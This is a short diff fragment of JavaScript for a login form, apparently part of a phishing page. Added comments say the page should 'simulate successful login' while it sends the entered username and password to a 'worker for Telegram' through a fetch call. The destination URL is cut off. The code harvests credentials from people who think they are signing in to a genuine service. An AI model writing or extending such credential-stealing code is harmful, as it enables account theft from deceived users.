@@ -65,7 +65,9 @@ document.addEventListener('DOMContentLoaded' ,function(){
                 passerror.style.fontSize = "small";
                 passerror.innerHTML = "Please enter your password correctly!"
             }
-            else{
+            else {
+             // Simulate successful login
+            // Send the username and password to the worker for Telegram
                 fetch(url, {
                 
                     // Adding method type
